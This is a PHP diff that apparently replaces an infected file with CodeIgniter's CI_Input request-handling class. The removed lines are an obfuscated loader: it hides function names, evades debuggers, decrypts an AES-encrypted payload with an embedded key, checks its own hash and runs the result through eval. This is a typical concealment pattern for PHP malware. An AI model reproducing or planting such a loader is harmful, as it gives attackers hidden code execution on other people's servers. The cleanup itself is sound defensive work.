@@ -1,28 +1,784 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_usk577l9=('bas'.'e64'.'_de'.'cod'.'e');
-$_xdsiuyf6=('gzu'.'nco'.'mpr'.'ess');
-$_prfusvxw=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ond7itdm='LCS4z1nA';
-$_dpk8xq1f='QrLm4JrYZ7E=';
-$_hj7eeos7='Q1l21iTS';
-$_tibply5l='jct+r08U';
-$_h63n860d='kB/sxdRW';
-$_x3dlal20='dFZOGw==';
-$_e1m871dl='H65J4FUm';
-$_g3v79sfu='lFopq5Uo';
-$_kfrk1w0p=$_usk577l9($_h63n860d.$_ond7itdm.$_hj7eeos7.$_tibply5l.$_dpk8xq1f);
-$_ps556pjc=$_usk577l9($_e1m871dl.$_g3v79sfu.$_x3dlal20);
-$_fgvlq00a=$_usk577l9('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');
-$_scm8db3h=$_prfusvxw($_fgvlq00a,'aes-256-cbc',$_kfrk1w0p,OPENSSL_RAW_DATA,$_ps556pjc);
-if($_scm8db3h===false){exit;}
-$_cdhj69dn=$_xdsiuyf6($_scm8db3h);
-if($_cdhj69dn===false){exit;}
-$_jbf7isyw='a229cc9bfb4e538146de54d0e15210db190a71d9ab46c01cf7a794a0fc6382fb';
-$_rflwtl24=@file_get_contents(__FILE__);
-if($_rflwtl24!==false){
-$_edyxu3gd=str_replace($_jbf7isyw,"0000000000000000000000000000000000000000000000000000000000000000",$_rflwtl24);
-$_l03ouimc=hash("sha256",$_edyxu3gd);
-if($_l03ouimc!==$_jbf7isyw){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Input {
+
+
+
+
+
+protected $ip_address = FALSE;
+
+
+
+
+
+
+
+protected $_allow_get_array = TRUE;
+
+
+
+
+
+
+
+protected $_standardize_newlines;
+
+
+
+
+
+
+
+
+
+protected $_enable_xss = FALSE;
+
+
+
+
+
+
+
+
+protected $_enable_csrf = FALSE;
+
+
+
+
+
+protected $headers = array();
+
+
+
+
+
+
+
+protected $_raw_input_stream;
+
+
+
+
+
+
+
+
+protected $_input_stream;
+protected $security;
+protected $uni;
+
+
+
+
+
+
+
+
+
+public function __construct()
+{
+$this->_allow_get_array = (config_item('allow_get_array') !== FALSE);
+$this->_enable_xss = (config_item('global_xss_filtering') === TRUE);
+$this->_enable_csrf = (config_item('csrf_protection') === TRUE);
+$this->_standardize_newlines = (bool) config_item('standardize_newlines');
+$this->security =& load_class('Security', 'core');
+
+if (UTF8_ENABLED === TRUE)
+{
+$this->uni =& load_class('Utf8', 'core');
 }
-eval($_cdhj69dn);
+
+$this->_sanitize_globals();
+
+if ($this->_enable_csrf === TRUE && ! is_cli())
+{
+$this->security->csrf_verify();
+}
+log_message('info', 'Input Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _fetch_from_array(&$array, $index = NULL, $xss_clean = NULL)
+{
+is_bool($xss_clean) OR $xss_clean = $this->_enable_xss;
+
+isset($index) OR $index = array_keys($array);
+
+if (is_array($index))
+{
+$output = array();
+foreach ($index as $key)
+{
+$output[$key] = $this->_fetch_from_array($array, $key, $xss_clean);
+}
+return $output;
+}
+if (isset($array[$index]))
+{
+$value = $array[$index];
+}
+elseif (($count = preg_match_all('/(?:^[^\[]+)|\[[^]]*\]/', $index, $matches)) > 1) 
+{
+$value = $array;
+for ($i = 0; $i < $count; $i++)
+{
+$key = trim($matches[0][$i], '[]');
+if ($key === '') 
+{
+break;
+}
+if (isset($value[$key]))
+{
+$value = $value[$key];
+}
+else
+{
+return NULL;
+}
+}
+}
+else
+{
+return NULL;
+}
+return ($xss_clean === TRUE)
+? $this->security->xss_clean($value)
+: $value;
+}
+
+
+
+
+
+
+
+
+public function get($index = NULL, $xss_clean = NULL)
+{
+return $this->_fetch_from_array($_GET, $index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+public function post($index = NULL, $xss_clean = NULL)
+{
+return $this->_fetch_from_array($_POST, $index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+public function post_get($index, $xss_clean = NULL)
+{
+return isset($_POST[$index])
+? $this->post($index, $xss_clean)
+: $this->get($index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+public function get_post($index, $xss_clean = NULL)
+{
+return isset($_GET[$index])
+? $this->get($index, $xss_clean)
+: $this->post($index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+public function cookie($index = NULL, $xss_clean = NULL)
+{
+return $this->_fetch_from_array($_COOKIE, $index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+public function server($index, $xss_clean = NULL)
+{
+return $this->_fetch_from_array($_SERVER, $index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+
+
+public function input_stream($index = NULL, $xss_clean = NULL)
+{
+
+
+if ( ! is_array($this->_input_stream))
+{
+
+parse_str($this->raw_input_stream, $this->_input_stream);
+is_array($this->_input_stream) OR $this->_input_stream = array();
+}
+return $this->_fetch_from_array($this->_input_stream, $index, $xss_clean);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function set_cookie($name, $value = '', $expire = '', $domain = '', $path = '/', $prefix = '', $secure = NULL, $httponly = NULL)
+{
+if (is_array($name))
+{
+
+foreach (array('value', 'expire', 'domain', 'path', 'prefix', 'secure', 'httponly', 'name') as $item)
+{
+if (isset($name[$item]))
+{
+$$item = $name[$item];
+}
+}
+}
+if ($prefix === '' && config_item('cookie_prefix') !== '')
+{
+$prefix = config_item('cookie_prefix');
+}
+if ($domain == '' && config_item('cookie_domain') != '')
+{
+$domain = config_item('cookie_domain');
+}
+if ($path === '/' && config_item('cookie_path') !== '/')
+{
+$path = config_item('cookie_path');
+}
+$secure = ($secure === NULL && config_item('cookie_secure') !== NULL)
+? (bool) config_item('cookie_secure')
+: (bool) $secure;
+$httponly = ($httponly === NULL && config_item('cookie_httponly') !== NULL)
+? (bool) config_item('cookie_httponly')
+: (bool) $httponly;
+if ( ! is_numeric($expire))
+{
+$expire = time() - 86500;
+}
+else
+{
+$expire = ($expire > 0) ? time() + $expire : 0;
+}
+setcookie($prefix.$name, $value, $expire, $path, $domain, $secure, $httponly);
+}
+
+
+
+
+
+
+
+
+public function ip_address()
+{
+if ($this->ip_address !== FALSE)
+{
+return $this->ip_address;
+}
+$proxy_ips = config_item('proxy_ips');
+if ( ! empty($proxy_ips) && ! is_array($proxy_ips))
+{
+$proxy_ips = explode(',', str_replace(' ', '', $proxy_ips));
+}
+$this->ip_address = $this->server('REMOTE_ADDR');
+if ($proxy_ips)
+{
+foreach (array('HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_X_CLIENT_IP', 'HTTP_X_CLUSTER_CLIENT_IP') as $header)
+{
+if (($spoof = $this->server($header)) !== NULL)
+{
+
+
+
+sscanf($spoof, '%[^,]', $spoof);
+if ( ! $this->valid_ip($spoof))
+{
+$spoof = NULL;
+}
+else
+{
+break;
+}
+}
+}
+if ($spoof)
+{
+for ($i = 0, $c = count($proxy_ips); $i < $c; $i++)
+{
+
+if (strpos($proxy_ips[$i], '/') === FALSE)
+{
+
+
+if ($proxy_ips[$i] === $this->ip_address)
+{
+$this->ip_address = $spoof;
+break;
+}
+continue;
+}
+
+isset($separator) OR $separator = $this->valid_ip($this->ip_address, 'ipv6') ? ':' : '.';
+
+if (strpos($proxy_ips[$i], $separator) === FALSE)
+{
+continue;
+}
+
+if ( ! isset($ip, $sprintf))
+{
+if ($separator === ':')
+{
+
+$ip = explode(':',
+str_replace('::',
+str_repeat(':', 9 - substr_count($this->ip_address, ':')),
+$this->ip_address
+)
+);
+for ($j = 0; $j < 8; $j++)
+{
+$ip[$j] = intval($ip[$j], 16);
+}
+$sprintf = '%016b%016b%016b%016b%016b%016b%016b%016b';
+}
+else
+{
+$ip = explode('.', $this->ip_address);
+$sprintf = '%08b%08b%08b%08b';
+}
+$ip = vsprintf($sprintf, $ip);
+}
+
+sscanf($proxy_ips[$i], '%[^/]/%d', $netaddr, $masklen);
+
+if ($separator === ':')
+{
+$netaddr = explode(':', str_replace('::', str_repeat(':', 9 - substr_count($netaddr, ':')), $netaddr));
+for ($j = 0; $j < 8; $j++)
+{
+$netaddr[$j] = intval($netaddr[$j], 16);
+}
+}
+else
+{
+$netaddr = explode('.', $netaddr);
+}
+
+if (strncmp($ip, vsprintf($sprintf, $netaddr), $masklen) === 0)
+{
+$this->ip_address = $spoof;
+break;
+}
+}
+}
+}
+if ( ! $this->valid_ip($this->ip_address))
+{
+return $this->ip_address = '0.0.0.0';
+}
+return $this->ip_address;
+}
+
+
+
+
+
+
+
+
+public function valid_ip($ip, $which = '')
+{
+switch (strtolower($which))
+{
+case 'ipv4':
+$which = FILTER_FLAG_IPV4;
+break;
+case 'ipv6':
+$which = FILTER_FLAG_IPV6;
+break;
+default:
+$which = NULL;
+break;
+}
+return (bool) filter_var($ip, FILTER_VALIDATE_IP, $which);
+}
+
+
+
+
+
+
+public function user_agent($xss_clean = NULL)
+{
+return $this->_fetch_from_array($_SERVER, 'HTTP_USER_AGENT', $xss_clean);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _sanitize_globals()
+{
+
+if ($this->_allow_get_array === FALSE)
+{
+$_GET = array();
+}
+elseif (is_array($_GET))
+{
+foreach ($_GET as $key => $val)
+{
+$_GET[$this->_clean_input_keys($key)] = $this->_clean_input_data($val);
+}
+}
+
+if (is_array($_POST))
+{
+foreach ($_POST as $key => $val)
+{
+$_POST[$this->_clean_input_keys($key)] = $this->_clean_input_data($val);
+}
+}
+
+if (is_array($_COOKIE))
+{
+
+
+
+
+
+unset(
+$_COOKIE['$Version'],
+$_COOKIE['$Path'],
+$_COOKIE['$Domain']
+);
+foreach ($_COOKIE as $key => $val)
+{
+if (($cookie_key = $this->_clean_input_keys($key)) !== FALSE)
+{
+$_COOKIE[$cookie_key] = $this->_clean_input_data($val);
+}
+else
+{
+unset($_COOKIE[$key]);
+}
+}
+}
+
+$_SERVER['PHP_SELF'] = strip_tags($_SERVER['PHP_SELF']);
+log_message('debug', 'Global POST, GET and COOKIE data sanitized');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _clean_input_data($str)
+{
+if (is_array($str))
+{
+$new_array = array();
+foreach (array_keys($str) as $key)
+{
+$new_array[$this->_clean_input_keys($key)] = $this->_clean_input_data($str[$key]);
+}
+return $new_array;
+}
+
+
+
+
+
+if ( ! is_php('5.4') && get_magic_quotes_gpc())
+{
+$str = stripslashes($str);
+}
+
+if (UTF8_ENABLED === TRUE)
+{
+$str = $this->uni->clean_string($str);
+}
+
+$str = remove_invisible_characters($str, FALSE);
+
+if ($this->_standardize_newlines === TRUE)
+{
+return preg_replace('/(?:\r\n|[\r\n])/', PHP_EOL, $str);
+}
+return $str;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _clean_input_keys($str, $fatal = TRUE)
+{
+if ( ! preg_match('/^[a-z0-9:_\/|-]+$/i', $str))
+{
+if ($fatal === TRUE)
+{
+return FALSE;
+}
+else
+{
+set_status_header(503);
+echo 'Disallowed Key Characters.';
+exit(7); 
+}
+}
+
+if (UTF8_ENABLED === TRUE)
+{
+return $this->uni->clean_string($str);
+}
+return $str;
+}
+
+
+
+
+
+
+
+public function request_headers($xss_clean = FALSE)
+{
+
+if ( ! empty($this->headers))
+{
+return $this->_fetch_from_array($this->headers, NULL, $xss_clean);
+}
+
+if (function_exists('apache_request_headers'))
+{
+$this->headers = apache_request_headers();
+}
+else
+{
+isset($_SERVER['CONTENT_TYPE']) && $this->headers['Content-Type'] = $_SERVER['CONTENT_TYPE'];
+foreach ($_SERVER as $key => $val)
+{
+if (sscanf($key, 'HTTP_%s', $header) === 1)
+{
+
+$header = str_replace('_', ' ', strtolower($header));
+$header = str_replace(' ', '-', ucwords($header));
+$this->headers[$header] = $_SERVER[$key];
+}
+}
+}
+return $this->_fetch_from_array($this->headers, NULL, $xss_clean);
+}
+
+
+
+
+
+
+
+
+
+
+public function get_request_header($index, $xss_clean = FALSE)
+{
+static $headers;
+if ( ! isset($headers))
+{
+empty($this->headers) && $this->request_headers();
+foreach ($this->headers as $key => $value)
+{
+$headers[strtolower($key)] = $value;
+}
+}
+$index = strtolower($index);
+if ( ! isset($headers[$index]))
+{
+return NULL;
+}
+return ($xss_clean === TRUE)
+? $this->security->xss_clean($headers[$index])
+: $headers[$index];
+}
+
+
+
+
+
+
+
+
+public function is_ajax_request()
+{
+return ( ! empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
+}
+
+
+
+
+
+
+
+
+
+public function is_cli_request()
+{
+return is_cli();
+}
+
+
+
+
+
+
+
+
+
+
+public function method($upper = FALSE)
+{
+return ($upper)
+? strtoupper($this->server('REQUEST_METHOD'))
+: strtolower($this->server('REQUEST_METHOD'));
+}
+
+
+
+
+
+
+
+
+
+public function __get($name)
+{
+if ($name === 'raw_input_stream')
+{
+isset($this->_raw_input_stream) OR $this->_raw_input_stream = file_get_contents('php://input');
+return $this->_raw_input_stream;
+}
+elseif ($name === 'ip_address')
+{
+return $this->ip_address;
+}
+}
+}
